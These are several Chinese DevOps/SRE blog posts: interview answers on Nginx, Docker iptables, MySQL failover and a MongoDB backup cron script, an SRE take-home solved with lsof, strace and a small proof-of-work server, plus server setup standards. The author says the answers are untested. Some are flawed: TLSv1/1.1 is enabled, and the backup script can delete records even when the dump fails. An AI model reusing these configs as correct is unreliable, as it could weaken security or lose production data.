Q2根据要求提供一份 Nginx 配置, 要求如下：

域名：xxx.com, 支持 https、HTTP&#x2F;2
非 http 请求经过 301 重定向到 https
根据 UA 进行判断，如果包含关键字 “Google Bot”, 反向代理到 server_bot[bot.xxx.com] 去处理
&#x2F;api&#x2F;{name} 路径的请求通过 unix sock 发送到本地 php-fpm，文件映射 &#x2F;www&#x2F;api&#x2F;{name}.php
&#x2F;api&#x2F;{name} 路径下需要增加限流设置，只允许每秒 1.5 个请求，超过限制的请求返回 http code 429
&#x2F;statics&#x2F; 目录下是纯静态文件，需要做一些优化配置
其它请求指向目录 &#x2F;www&#x2F;xxx&#x2F;, 查找顺序 index.html –&gt; public&#x2F;index.html –&gt; &#x2F;api&#x2F;index

Q3现有一台服务器，如下图所示上面通过默认安装并运行了 3 个 docker 容器，需要通过 iptables 进行网络配置。请给出命令：

只有 Docker_A 与 Docker_B 之间可以相互通信，Docker_C 不能访问其它两个容器
只允许内网 IP 为 192.168.1.1 - 192.168.1.30 的内网 IP 访问所有容器
Docker_A:8080 与 Docker_C:80 通过与自身相同端口对外网提供服务, Docker_B:3316 不对外网提供服务
所有配置需要固化，重启服务器自动生效


Q4已知生产环境数据库结构如图所示:
graph LR;    master--&gt;slave_1;    master--&gt;slave_2;    slave_1--&gt;slave_3;    slave_2--&gt;slave_4;

因为 master 偶尔有硬件问题，需要先将 slave_1 提升为新 master, 然后旧 master 变成 slave_1。请给出操作方案和关键命令。

主从数据库服务均处于独立服务器上，有独立的IP;
应用程序写入数据库通过域名 mysql-master.xxx.com 访问;
应用程序读取数据通过 Haproxy(mysql-slave.xxx.com) 访问所有从库 01-04
尽量平滑处理，不影响生产环境

Q5在生产环境中，应用程序是通过 Haproxy 来读取 slave 集群，但是偶尔会产生

SQLSTATE[HY000]: General error: 2006 MySQL server has gone away

的错误，请根据经验，给出一排查方案与可能的方向，与开发一起定位问题, 现已经排查：

故障发生时，服务器之间防火墙正常，服务器之间可以正常通信;
故障SQL均可以正常查询，同时不存在性能问题;
故障频率没有发现特别规律，与服务器负载没有正相关;
查看各服务的日志，只发现了错误信息，但没有进一步的说明;

graph LR;    Service--&gt;Haproxy;    Haproxy--&gt;slave_1;    Haproxy--&gt;slave_2;    Haproxy--&gt;slave_3;    Haproxy--&gt;slave_4;

我的答案A1如下是备份用的 bash 程序，放在任意合适的目录即可，不过需要记下来路径，cron 的程序 backup_mongo 里要用到，并且给其赋予可执行权限。
#!/bin/bash# filename: backup_mongo.shLAST_MONTH_START=$(date -d &quot;$(date +%Y-%m-01) -1 month&quot; +%Y-%m-01)LAST_MONTH_END=$(date -d &quot;$(date +%Y-%m-01)&quot; +%Y-%m-%d)DATABASE=&quot;test&quot;COLLECTION=&quot;user_log&quot;BACKUP_DIR=&quot;backup&quot;BACKUP_PATH=&quot;$&#123;BACKUP_DIR&#125;/$&#123;LAST_MONTH_START&#125;_$&#123;LAST_MONTH_END&#125;_user_log_backup.gz&quot;LOG_FILE=&quot;$&#123;BACKUP_DIR&#125;/backup_log_$(date +%Y%m%d_%H%M%S).txt&quot;SFTP_SERVER=&quot;bakup@bakup.xxx.com&quot;WEBHOOK_URL=&quot;https://monitor.xxx.com/webhook/mongodb&quot;[ -e $&#123;BACKUP_DIR&#125; ] || mkdir -p $&#123;BACKUP_DIR&#125;echo &quot;$(date +&quot;%Y-%m-%d %H:%M:%S&quot;) - Starting backup and compression for $&#123;DATABASE&#125;.$&#123;COLLECTION&#125; for the period from $&#123;LAST_MONTH_START&#125; to $&#123;LAST_MONTH_END&#125;&quot; | \        tee -a &quot;$LOG_FILE&quot;&#123;        mongodump --db=&quot;$DATABASE&quot; --collection=&quot;$COLLECTION&quot; \                --gzip --archive=&quot;$BACKUP_PATH&quot; \                --query=&quot;&#123; &#x27;create_on&#x27;: &#123; &#x27;\$gte&#x27;: &#123; &#x27;\$date&#x27;: &#x27;$&#123;LAST_MONTH_START&#125;T00:00:00.000&#x27; &#125;, &#x27;\$lt&#x27;: &#123; &#x27;\$date&#x27;: &#x27;$&#123;LAST_MONTH_END&#125;T00:00:00.000&#x27; &#125; &#125; &#125;&quot;        sftp $SFTP_SERVER &lt;&lt;&lt; $&#x27;put &#x27;&quot;$&#123;BACKUP_PATH&#125;&quot;        mongo &quot;$DATABASE&quot; \                --eval \                &quot;db.$COLLECTION.remove(&#123; &#x27;create_on&#x27;: &#123; &#x27;\$gte&#x27;: &#123; &#x27;\$date&#x27;: &#x27;$&#123;LAST_MONTH_START&#125;T00:00:00.000&#x27; &#125;, &#x27;\$lt&#x27;: &#123; &#x27;\$date&#x27;: &#x27;$&#123;LAST_MONTH_END&#125;T00:00:00.000&#x27; &#125; &#125; &#125;);&quot;        echo &quot;$(date +&quot;%Y-%m-%d %H:%M:%S&quot;) - Backup and clean up success.&quot; | tee -a &quot;$LOG_FILE&quot;&#125; || &#123;        echo &quot;$(date +&quot;%Y-%m-%d %H:%M:%S&quot;) - Backup or clean up script failed, sending message...&quot; | tee -a &quot;$LOG_FILE&quot;        curl -X POST &quot;$WEBHOOK_URL&quot; --data &#x27;Backup or clean up script failed&#x27;        exit 1&#125;

如下是 cron 的配置文件 backup_mongo 的内容：
SHELL=/bin/bashPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin0 1 1 * * root /path/to/backup_mongo.sh &gt; /dev/null 2&gt;&amp;1

这个文件请放在目录 &#x2F;etc&#x2F;cron.d&#x2F; 下
A2
如果是 Debian 系的系统，请把文件 ipo.com.conf 放到 &#x2F;etc&#x2F;nginx&#x2F;sites.available&#x2F; 目录下并在 &#x2F;etc&#x2F;nginx&#x2F;sites.enable&#x2F; 下做一个软链。
但如果是红帽系的系统，请把文件 ipo.com.conf 放到目录 &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F; 下。

以下是文件 xxx.com.conf 的内容：
limit_req_zone $binary_remote_addr zone=api_per_ip:10m rate=90r/m; # 1.5r/s by per IPlimit_req_zone $server_name zone=api_per_server:10m rate=10r/s; # 1.5r/s by per serverupstream server_bot &#123;    server bot.xxx.com:443;&#125;server &#123;    listen              80;    listen              [::]:80;    server_name         xxx.com;    return              301 https://$host$request_uri;&#125;server &#123;    listen              443 ssl;    http2               on;    server_name         xxx.com;    ssl_certificate     xxx.com.crt;    ssl_certificate_key xxx.com.key;    ssl_protocols       TLSv1 TLSv1.1 TLSv1.2 TLSv1.3;    ssl_ciphers         HIGH:!aNULL:!MD5;    # 或者直接启用 HSTS    # add_header Strict-Transport-Security &quot;max-age=31536000; includeSubDomains&quot; always;    if ($http_user_agent ~ &quot;Google Bot&quot;) &#123;        set $google_bot true;    &#125;    location /api/ &#123;        limit_req zone=api_per_ip burst=5 nodelay; # or using api_per_server        limit_req_status 429;        fastcgi_pass unix:/var/run/php-fpm.sock;        fastcgi_param SCRIPT_FILENAME /www$fastcgi_script_name.php; # /api/a -&gt; /www/api/a.php    &#125;    location /statics/ &#123;        autoindex       off;        gzip            on;        gzip_comp_level 2;        gzip_min_length 1000;        gzip_proxied    expired no-cache no-store private auth;        gzip_types      text/plain text/css application/json application/x-javascript text/xml application/xml application/xml+rss text/javascript;        expires         365d;        access_log      off;    &#125;    location / &#123;        if ($google_bot = &#x27;true&#x27;) &#123;            proxy_pass https://server_bot;            proxy_ssl_certificate         /etc/nginx/client.pem;            proxy_ssl_certificate_key     /etc/nginx/client.key;            proxy_ssl_protocols           TLSv1 TLSv1.1 TLSv1.2;            proxy_ssl_ciphers             HIGH:!aNULL:!MD5;            proxy_ssl_trusted_certificate /etc/nginx/trusted_ca_cert.crt;            proxy_ssl_verify        on;            proxy_ssl_verify_depth  2;            proxy_ssl_session_reuse on;        &#125;    &#125;    root /www/xxx/;    index index.html public/index.html /api/index;&#125;

A3原来给出来的四个需求：

只有Docker_A 与 Docker_B 之间可以相互通信，Docker_C 不能访问其它两个容器;
只允许内网IP为 192.168.1.1 - 192.168.1.30 的内网IP访问所有容器;
Docker_A:8080 与 Docker_C:80 通过相同端口对外网提供服务, Docker_B:3316 不对外网提供服务;
所有配置需要固化，重启服务器自动生效;

3.1因为如果不做特殊设置，Docker 容器之间是可以直接互通的，所以这里只需要限制 Docker_C 不能访问 Docker_A 和 Docker_B 即可
iptables -I DOCKER-USER -s 172.17.0.2 -d 172.17.0.4 -j REJECTiptables -I DOCKER-USER -s 172.17.0.3 -d 172.17.0.4 -j REJECT

这样设置完毕，反向 172.17.0.4-&gt;172.17.0.2 和 172.17.0.4-&gt;172.17.0.3 也是不通的，因为回包被拒了。所以反向的 rules 就不用写了。
3.2第二问有些没太理解，理论上来讲，Docker 容器的网络跟 host 外面是隔离的，无论是 host 上 eth_private 还是 eth_public 上来的流量，应该都是不能直接访问任何容器的。
我只能大概用管饭文档上的一个利子来试着看是不是满足需求：
iptables -I DOCKER-USER -m iprange \    -i eth_private ! --src-range 192.168.1.1-192.168.1.30 \    -j DROP

3.3iptables -t filter -A DOCKER -d 172.17.0.2/32 \    -i eth_public -o Docker0 -p tcp \    -m tcp --dport 8080 -j ACCEPTiptables -t filter -A DOCKER -d 172.17.0.3/32 \    -i eth_public -o Docker0 -p tcp \    -m tcp --dport 80 -j ACCEPTiptables -t nat -A POSTROUTING -s 172.17.0.2/32 \    -d 172.17.0.2/32 -p tcp -m tcp \    --dport 8080 -j MASQUERADEiptables -t nat -A POSTROUTING -s 172.17.0.3/32 \    -d 172.17.0.3/32 -p tcp -m tcp \    --dport 80 -j MASQUERADE# 以上两句我其实也没想明白，我是看了 Docker host 的 iptables 的实际情况照着抄的iptables -t nat -A DOCKER -i eth_public -p tcp \    -m tcp --dport 8080 -j DNAT \    --to-destination 172.17.0.2:8080iptables -t nat -A DOCKER -i eth_public -p tcp \    -m tcp --dport 80 -j DNAT \    --to-destination 172.17.0.3:80

3.4这个问题的答案依 Linux 发布版的不同以及具体软件的不同而不同
iptables-save &gt; /etc/iptables/rules.v4# 或者是红帽系的话iptables-save &gt; /etc/sysconfig/iptables# orservice iptables save

A4这道题我基本上考虑的最多的是怎么样保持数据一致性。系统可用性的考虑反倒是其次。
修改域名解析
从域名 mysql-slave.xxx.com 解析，将 slave_1 摘出来
尽量将域名 mysql-master.xxx.com 到 master 的指向去掉

逐级设置成 readonly
将 master 设置成 readonly(set global read_only=ON;set global super_read_only=ON;)
等 slave_1 和 slave_2 的数据跟 master 同步之后（show slave status 里看），将 slave_1 和 slave_2 设置为 readonly
最后等 slave_3 的数据同步之后，将其也设为 readonly

slave_1 变成 master
slave_3 从 slave_1 下面拆出来，挂到 slave_2 下面（用命令 STOP SLAVE IO_THREAD;CHANGE MASTER TO slave_2;START SLAVE IO_THREAD）
slave_1 上停掉 slave，起来 master（用命令 stop slave;reset slave all;show master status）
slave_1 上还要启用 replication 的用户

slave_2 挂到 slave_1(new master) 下面
slave_2 上执行 STOP SLAVE IO_THREAD;CHANGE MASTER TO slave_1;START SLAVE IO_THREAD

master 变成 slave
master 上执行 reset master; reset slave all; CHANGE MASTER TO slave_1

slave_3 从 slave_2 下拆出来，挂到 master 下面
slave_3 下执行 STOP SLAVE IO_THREAD;CHANGE MASTER TO master;START SLAVE IO_THREAD

收尾工作：关掉 readonly 并改回域名解析
从 slave_1(new master) 开始，逐级关掉 readonly(set global read_only=OFF;)
确认数据同步正常之后，修改域名解析：
将域名 mysql-slave.xxx.com 将 master（new slave） 加进去
将域名 mysql-master.xxx.com 指向 slave_1(new master)



A5
2006 MySQL server has gone away

这个错误的坑我之前刚刚踩过（说是刚刚，其实也是有几个月了），这个错误出现的原因主要就是因为服务器端认为某个连接的 session 超时了，就给强制断掉了，这边客户端不知道，还在傻乎乎的发消息，于是就会得到错误提示：has gone away，控制这种超时的参数有两个：wait_timeout 和 interactive_timeout，但是实际上影响超时的是 session 级别的 wait_timeout 参数。
而 session 级别的 wait_timeout 参数在客户端交互式登录（通常的 MySQL 客户端登录）时，继承的是 global 的 interactive_timeout 参数；而在非交互式登录（比如程序或 jdbc 这种连上来的情况），继承的是 global 级别的 wait_timeout 参数。
所以解决这个问题也有很多办法，最简单的，将这两个参数的值调大。其实这两个参数的缺省值是 8 小时，已经不小了。
要是仅从排错的角度出发的话，那么肯定要 MySQL server 要看日志、HAProxy 要看日志，出错的客户端要看日志，还要在出错的时候看 MySQL server 的状态（show processliss 什么的）
我刚看了有文档说，HAProxy 的 timeout server 和 timeout client 的两个值要跟 MySQL server 上的 session 级的 wait_timeout 一致。
还有，客户端连 HAProxy 的 MySQL 代理时，结束时要显式的主动断开连接。这个我想还好，最怕就是有连接池连 HAProxy 的 MySQL 的代理，我们当时踩坑也是因为有连接池……如果有，大概率是连接池的问题。
总结我的答案不一定都对，因为我也没有环境去具体测试，但如果这些题是工作中给到我的真实工作内容，我有信心很好的完成他们。

本文由 老杨 原创，转载请注明出处。
]]></content>
      <tags>
        <tag>docker</tag>
        <tag>bash</tag>
        <tag>interview</tag>
        <tag>DevOps</tag>
        <tag>mongodb</tag>
        <tag>nginx</tag>
        <tag>haproxy</tag>
        <tag>mysql</tag>
        <tag>iptables</tag>
        <tag>sftp</tag>
      </tags>
  </entry>
  <entry>
    <title>我做的某公司 SRE 职位的面试题</title>
    <url>/2024/02/%E6%88%91%E5%81%9A%E7%9A%84%E6%9F%90%E5%85%AC%E5%8F%B8%20SRE%20%E8%81%8C%E4%BD%8D%E7%9A%84%E9%9D%A2%E8%AF%95%E9%A2%98/index.html</url>
    <content><![CDATA[简介这是之前有一家公司招 SRE，我投了简历，然后被给了份题让先做一下，于是便有了这篇“水”文。
当然，最终我并没有拿到这个 offer，最早是说一周内安排面试的，后来又说是这个岗位暂停了。


详情第一题题目有效时间只有 4 小时，当时没记下来，现在只能凭记忆力大概写一下了。
大概是系统有个进程在写文件 /tmp/hugelog
第一题第一问这一问肯定是要求将其找出来（找到 process id）
lsof | grep /tmp/hugelog


seeknhide  773                           root    3w      REG              252,3  6887024     655475 &#x2F;tmp&#x2F;hugelogseeknhide  773  802 seeknhide            root    3w      REG              252,3  6887024     655475 &#x2F;tmp&#x2F;hugelogseeknhide  773  804 seeknhide            root    3w      REG              252,3  6887024     655475 &#x2F;tmp&#x2F;hugelogseeknhide  773  805 seeknhide            root    3w      REG              252,3  6887024     655475 &#x2F;tmp&#x2F;hugelog

ps auxww | grep 773


root         773  0.0  0.2 710484  2136 ?        Sl   Jun18   0:22 &#x2F;root&#x2F;challs&#x2F;01_seeknhide&#x2F;seeknhideroot        5877  0.0  0.2   6608  2484 pts&#x2F;0    S+   13:53   0:00 grep –color&#x3D;auto 773

so, the process is &#x2F;root&#x2F;challs&#x2F;01_seeknhide&#x2F;seeknhide, process id is: 773
第一题第二问写 /tmp/hugelog 的程序文件已经被删除，但请算出其的 md5 码
readlink -f /proc/773/exe


&#x2F;root&#x2F;challs&#x2F;01_seeknhide&#x2F;seeknhide (deleted)

cp /proc/773/exe amd5sum a


eba0e82f5b454a492077c67ab89ae033  a

so the execute file is: &#x2F;root&#x2F;challs&#x2F;01_seeknhide&#x2F;seeknhide, but it was deleted.
and the md5sum is: eba0e82f5b454a492077c67ab89ae033
第一题第三问将这个 process 杀掉
kill 773

第二题有一个 app 代码项目，有代码，有 Dockerfile。
第二题第一问需要 build 并运行一个 docker 容器，其监听主机的 8888 端口，可以用命令 curl http://127.0.0.1:8888 来测试（返回 Hello, World!）。
cd appdocker build -t app:latest .docker run -it -d -p 8888:4657 app:latestcurl http://127.0.0.1:8888


curl: (52) Empty reply from server

# backup firstlycp serve.py serve.py.orivim serve.py# change from localhost to 0.0.0.0

docker build -t app:new .# stop and delete the old containerdocker stop cool_germaindocker rm cool_germain# then run it by new imagedocker run -it -d -p 8888:4567 app:new# test itcurl http://127.0.0.1:8888


Hello, World!

第二题第二问做了什么修改以及为什么要做这个修改。
我的答案是：fix it by binding host from ‘localhot’ to ‘0.0.0.0’
第三题日志文件 jwt.log 里有一些数据纪录，有些是真的，有些是假的，需要找出来真的数据纪录的条数。（有代码的要附上源码）
import jwtimport base64import hashlibimport hmacimport syssecret = &quot;_welcome_to_chaitin_&quot;def verify_jwt(token):    try:        header, payload, signature = token.split(&#x27;.&#x27;)        header_json = base64.urlsafe_b64decode(header + &#x27;===&#x27;).decode()        payload_json = base64.urlsafe_b64decode(payload + &#x27;===&#x27;).decode()        message = f&#x27;&#123;header&#125;.&#123;payload&#125;&#x27;        secret_bytes = secret.encode()        message_bytes = message.encode()        expected_signature = base64.urlsafe_b64encode(hmac.new(secret_bytes, message_bytes, hashlib.sha256).digest()).rstrip(b&#x27;=&#x27;)        if signature.encode() == expected_signature:            return True    except Exception as e:        print(f&quot;Error verifying JWT: &#123;e&#125;&quot;, file=sys.stderr)    return Falseauthentic_count = 0fake_count = 0print(&quot;Script execution started.&quot;)with open(&#x27;jwt.log&#x27;, &#x27;r&#x27;) as file:    for line in file:        jwt_token = line.strip()        if verify_jwt(jwt_token):            authentic_count += 1        else:            fake_count += 1print(&quot;Script execution finished.&quot;)print(f&quot;Number of authentic JWTs: &#123;authentic_count&#125;&quot;)print(f&quot;Number of fake JWTs: &#123;fake_count&#125;&quot;)

python3 jwt.py


Script execution started.Script execution finished.Number of authentic JWTs: 768Number of fake JWTs: 90Script execution started.Script execution finished.Number of authentic JWTs: 768Number of fake JWTs: 90

so, The number of authentic JWTs is: 768
第四题有个文件：make_me_happy
第四题第一问尽量找出这个文件相关的信息。
这个程序执行时会去连本地的一个接口，把这个接口找出来。
file make_me_happy


make_me_happy: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, Go BuildID&#x3D;w3cEj7RamW7-qGzf3Nhs&#x2F;UpW-8zX_rMqqAZOxch9q&#x2F;g8QtiW2olQfv2K-oXiQs&#x2F;KuNmNVsa3dhXuFD3EuZR, with debug_info, not stripped

ls -l make_me_happy


-rw-r–r– 1 root root 6777227 Feb 16  2023 make_me_happy

has no execute permission.
ldd make_me_happy

linux-vdso.so.1 (0x00007ffcd23ca000)libresolv.so.2 =&gt; /lib/x86_64-linux-gnu/libresolv.so.2 (0x00007fdcb92fc000)libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fdcb90d4000)/lib64/ld-linux-x86-64.so.2 (0x00007fdcb9319000) 

strings make_me_happy | grep -iE &#x27;(http|https|server|socket)://127&#x27;


……invalid signature: parent certificate cannot sign this kind of certificatehttp://127.0.0.1:7777/pow?q=give_me_a_string_whose_sha256sum_in_hex_begins_with_%srefusing to use HTTP_PROXY value in CGI environment……

# make make_me_happy excutable with /usr/bin/chmod has no execute permission# using python3python3

import osos.chmod(&#x27;make_me_happy&#x27;, 0o755)

strace ./make_me_happy


……openat(AT_FDCWD, “&#x2F;root&#x2F;.config&#x2F;make_me_happy.conf”, O_RDONLY|O_CLOEXEC) &#x3D; -1 ENOENT (No such file or directory)write(1, “Not OK\n”, 7Not OK

touch /root/.config/make_me_happy.confstrace ./make_me_happy


……connect(7, {sa_family&#x3D;AF_INET, sin_port&#x3D;htons(7777), sin_addr&#x3D;inet_addr(“127.0.0.1”)}, 16) &#x3D; -1 EINPROGRESS (Operation now in progress)epoll_ctl(4, EPOLL_CTL_ADD, 7, {events&#x3D;EPOLLIN|EPOLLOUT|EPOLLRDHUP|EPOLLET, data&#x3D;{u32&#x3D;4114591560, u64&#x3D;140651408633672}}) &#x3D; 0epoll_pwait(4, [{events&#x3D;EPOLLIN|EPOLLOUT|EPOLLERR|EPOLLHUP|EPOLLRDHUP, data&#x3D;{u32&#x3D;4114591560, u64&#x3D;140651408633672}}], 128, 0, NULL, 0) &#x3D; 1getsockopt(7, SOL_SOCKET, SO_ERROR, [ECONNREFUSED], [4]) &#x3D; 0epoll_ctl(4, EPOLL_CTL_DEL, 7, 0xc0000bf074) &#x3D; 0close(7)                                &#x3D; 0write(1, “Not OK\n”, 7Not OK

nc -4l 7777 &amp;


[1] 7379

./make_me_happy


GET &#x2F;pow?q&#x3D;give_me_a_string_whose_sha256sum_in_hex_begins_with_7865 HTTP&#x2F;1.1Host: 127.0.0.1:7777User-Agent: Go-http-client&#x2F;1.1Accept-Encoding: gzip

第四题第二问想办法让这个程序在执行的时候，正确返回。
python3 server.py &amp;


Start HTTP server on port 7777…

./make_me_happy


127.0.0.1 - - [19&#x2F;Jun&#x2F;2024 17:19:02] “GET &#x2F;pow?q&#x3D;give_me_a_string_whose_sha256sum_in_hex_begins_with_e7ba HTTP&#x2F;1.1” 200 -OK! Thank you, I’m happy now!

echo $?


0

第四题第三问贴出来第二问的源码（如果有的话）。
我的答案：
the whole code(server.py) is:
import hashlibimport stringimport randomfrom urllib.parse import urlparse, parse_qsfrom http.server import SimpleHTTPRequestHandler, HTTPServerdef find_sha256_prefix(prefix):    while True:        candidate = &#x27;&#x27;.join(random.choices(string.ascii_letters + string.digits, k=16))        sha256sum = hashlib.sha256(candidate.encode()).hexdigest()        if sha256sum.startswith(prefix):            return candidateclass CustomHandler(SimpleHTTPRequestHandler):    def do_GET(self):        if self.path.startswith(&quot;/pow&quot;):            query_components = parse_qs(urlparse(self.path).query)            prefix_template = query_components.get(&#x27;q&#x27;, [&#x27;&#x27;])[0]            if &quot;with_&quot; in prefix_template:                prefix = prefix_template.split(&quot;with_&quot;)[1]                suffix = find_sha256_prefix(prefix)                response = suffix.encode()                self.send_response(200)                self.send_header(&#x27;Content-type&#x27;, &#x27;text/plain&#x27;)                self.send_header(&#x27;Content-length&#x27;, len(response))                self.end_headers()                self.wfile.write(response)        else:            self.send_response(404)            self.end_headers()def run():    server_address = (&#x27;&#x27;, 7777)    httpd = HTTPServer(server_address, CustomHandler)    print(&#x27;Start HTTP server on port 7777...&#x27;)    httpd.serve_forever()if __name__ == &quot;__main__&quot;:    run()

总结这倒还真是 SRE 的题目，基本上都跟开发有关系。这里由于需要的环境简单，而且公司方面提供了一个完整的试验环境，所以所有的 python 程序我都做过测试。

本文由 老杨 原创，转载请注明出处。
]]></content>
      <tags>
        <tag>docker</tag>
        <tag>bash</tag>
        <tag>python</tag>
        <tag>SRE</tag>
        <tag>interview</tag>
        <tag>lsof</tag>
        <tag>readlink</tag>
      </tags>
  </entry>
  <entry>
    <title>服务器操作系统安装配置标准推荐</title>
    <url>/2019/09/%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E6%A0%87%E5%87%86%E6%8E%A8%E8%8D%90/index.html</url>
    <content><![CDATA[操作系统安装配置规范从事运维这么长时间，每到一个新公司，都会涉及到写标准化、规范化、流程化、制度化文档的工作，这里就整理了一份，但愿对大家有帮助。
操作系统选型以下都是推荐值，如果没有特殊的需求，请都按照以下推荐值来操作

实体机：首选 CentOS 7 系列的最新版，其次选 Ubuntu Server 的最新的 LTS 的 64 位版本，目前最新的是 18.04
阿里云：选 Aliyun Linux 2 的最新版，当下是 2.1903；选 64 位版本
AWS：选 Amazon LInux 2 的最新版；选 64 位版本



操作系统安装SWAP 区现在基本上云主机缺省都没有 SWAP 区。
建议：

启用 SWAP 区，大小跟物理内存一样即可
在 kernel 参数里调低使用 SWAP 区的概率，详见 [[#10]]

公网地址
安装时不要选公网
如果需要公网
安装完以后单独购买 EIP，并绑定过来（需要注意的是：可能需要提高可买 EIP 数量的限额）



安全组
如无特殊需求一定要勾选 sg-whitelist 安全组
如有公网登录管理需求请勾选 sg-ssh 安全组
跑 web 服务的服务器还要勾选 sg-web 安全组

数据盘
裸盘格式化成 ext4 文件系统
挂载到系统的 &#x2F;data 下
&#x2F;etc&#x2F;fstab 里用 UUID 取代设备名，dump 和 fsck 两个选项都用 0

操作系统配置主机名idc 名称-项目-角色-集群-节点
用户和组
新建一个 sre 组
sre 组是运维团队所有成员及用户 deploy 的副组
每个运维团队成员都单独建一个账号并为每个成员部署自己的公钥
新建 deploy 用户
部署 deploy 用户的公钥（私钥在 {K77}，~&#x2F;.ssh&#x2F;authenticated_keys 文件里写公钥之前，写 from&#x3D;”10.254.1.201&#x2F;32 “，这里假设 10.254.1.201 是用 deploy 用户登录服务器的 IP 地址）

ssh 配置
禁止 root 直接登录
禁止非 root 用户密码登录
端口号改成 38522（三号楼 B 座 5 层 22 端口）

yum 配置参见文档：[[|]]
sudo 权限设置 sre 组有不需要密码用 root 身份执行所有命令的权限
kernel 调优调优的一些 kernerl 参数，放在 &#x2F;etc&#x2F;sysctl.d&#x2F; 目录下的文件里
disable IPv6cat /etc/sysctl.d/disableipv6.conf，显示内容如下：
net.ipv6.conf.all.disable_ipv6 = 1net.ipv6.conf.default.disable_ipv6 = 1

NETWORKcat /etc/sysctl.d/network.conf，显示内容如下：
# 尽可能多的扩展本地端口使用范围net.ipv4.ip_local_port_range = 1025    65535# accept 队列（保存 ESTABLISHED 状态的连接队列）。# 队列长度为 min(net.core.somaxconn,backlog)，# syncookies 打开的情况下，不需要设置太大，但缺省的 128 实在有点小net.core.somaxconn = 2048# 半连接队列（保存SYN_RECV状态的队列）的长度，# syncookies 打开的情况下，不需要设置太大net.ipv4.tcp_max_syn_backlog = 2048

系统cat /etc/sysctl.d/os.conf，显示内容如下：
# 尽可能少的使用 swapvm.swappiness = 10

时区配置Aliyun Linux 的话，不需要配置，直接就是好的。
否则：
cd /etcmv localtime localtime.bakln -s /usr/share/zoneinfo/Asia/Shanghai localtime

自启动服务调整如下服务是建议取消随机自启动的：

atd
aliyun（阿里云自带服务，建议干掉）
aegis（阿里云自带服务，建议干掉）

参照如下代码，将不需要随机自启动的服务干掉：
How to disable startup services from Aliyun

IPv6参见 [[#kernel | kernel 调优]]部分
disable SELinuxAliyun Linux 不用做，缺省就是 disable 的。
其他的，用如下代码：
How to disable SELinux on CentOS 7.x in code

定时任务（cron）定时任务的配置文件，按照具体情况不同，分别放到如下目录下：

&#x2F;etc&#x2F;cron.monthly：用来放每月执行但不太关心具体执行时间的任务
&#x2F;etc&#x2F;cron.weekly：用来放每周执行但不关心具体执行时间的任务
&#x2F;etc&#x2F;cron.daily：用来放每天执行但不关心具体执行时间的任务
&#x2F;etc&#x2F;cron.hourly：用来放每小时执行但不关心具体执行时间的任务
&#x2F;etc&#x2F;cron.d：用来放不适合放如上四个目录的任务

]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>规范</tag>
        <tag>标准</tag>
        <tag>优化</tag>
      </tags>
  </entry>
  <entry>
    <title>某个外包公司的面试总结</title>
    <url>/2022/04/%E6%9F%90%E4%B8%AA%E5%A4%96%E5%8C%85%E5%85%AC%E5%8F%B8%E7%9A%84%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/index.html</url>
    <content><![CDATA[缘起无非就是“又”失业了，重新开始找工作，原本还不想招惹外包公司，无奈行情不好，外包工作也是工作呀，于是乎，就定了某个外包公司的面试，第一面：外包公司的技术面。


心得体会主要问题都是跟 aws 有关系，这个岗位的甲方是个外企，肯定重度使用 aws。而且还在用 aws 的 eks 服务。
感觉面试官的视野还是很重要的。
几个具体问题有个细节：腾讯会议面试，面试官几个人，可能是三个，首先特意让我把视频打开，于是我打开了，但是对方并没有打开。好吧，我是求职者，不对等也正常。
但为什么面试需要让面试者打开视频呢？这个不太明白，也许相关 HR 会比较清楚这一点。
关于 eks 的 ingress问我 eks 里的服务通过 ingress 暴露出去，然后数据包是怎么从外网到 pod 的。
这个题我答的不好，前东家其实差不多就是这个架构：nginx-ingress，然后外面是 aws 的 LB，我一直在解释外网流量到 aws 的 LB 设备之后然后是转到 eks 集群的 node 节点的某个 tcp 端口，我的意思是，其实服务最终是通过 nodeport 透出去的。
上面我说的这个大概是基本上没太大问题的，但是人家问的应该不是这个。:(
其实上面我提到的 nodeport 透出去的服务正是 nginx-ingress（或者是 nginx-ingress-controller，具体忘了，我得再看看 nginx-ingress）
关于被 nginx 反代的服务如何获得客户端的真实 IP 的问题这个其实我比较熟悉，http 基本协议嘛。
我说这个简单，在反代的 nginx 配置里将 client ip 直接写入一个特定的 http 头，然后真实的服务里再把这个头取出来即可。
其实这个回答完全没毛病，我之前有项目就是这么干的。但面试官却感觉好像抓住了什么一样拼命问我到底是哪个 http 头？搞得我都有点上头了，我于是说：“哪个头不一样吗，只要跟后端协商好了就行了”。还被追问，还问一般标准是哪个头，于是我只能说 X-Forwarded-For，于是面试官认可了。
我其实没有细说为什么要另外弄一个头，这是因为客户端访问服务，中间可能会过 n 层代理，理论上每一层都会且必须要往 X-Forwarded-For 里写东西，但实际上，守规矩的人有，但绝对不是全部！于是我们的逻辑就是单独再搞一个 http 头，算是有点私有协议的意思，自己用，这样感觉比直接用 X-Forwarded-For 更靠谱一些。
Jenkins 怎么做代码触发自动构建（CI）某个面试官问的，我当时回答：我不知道。我真不知道，或者我们曾经也有用过这种功能，但因为具体不是我配的，我就没了解到。但我知道，这个是绝度可以实现的，大致猜想是通过 webhook 之类的东西来做就可以。
我又说，我们有时并没有用 Jenkins，面试官就逼问：“没有 Jenkins 怎么做 CI&#x2F;CD 呢？”，我当时就笑了，说：“我的好几个前司，项目的 CI&#x2F;CD 是直接在 gitlab 里做的。”（他可能不太清楚 gitlab 本身就有 CI&#x2F;CD 的功能）。而我恰恰由于要维护这个，曾经大概看过相关配置。
估计他也不知道 github-action 之类的东西吧。
关于 serverless我回答说之前的某司，我用过 aws 上的什么服务来着（我真是这么说的，我忘了那个叫 Lambda 了），用那个写了个 python 程序，定时执行一些操作。那个我理解就是 serverless
用过多少 aws 的服务于是我就说了一堆，但的确好多服务我忘了名字了，我只能简单介绍下这个服务是干啥的。我估计我用的好多服务面试官们也没用过，：）。这个很正常，就像他们用过的服务有些我也没用过一样。
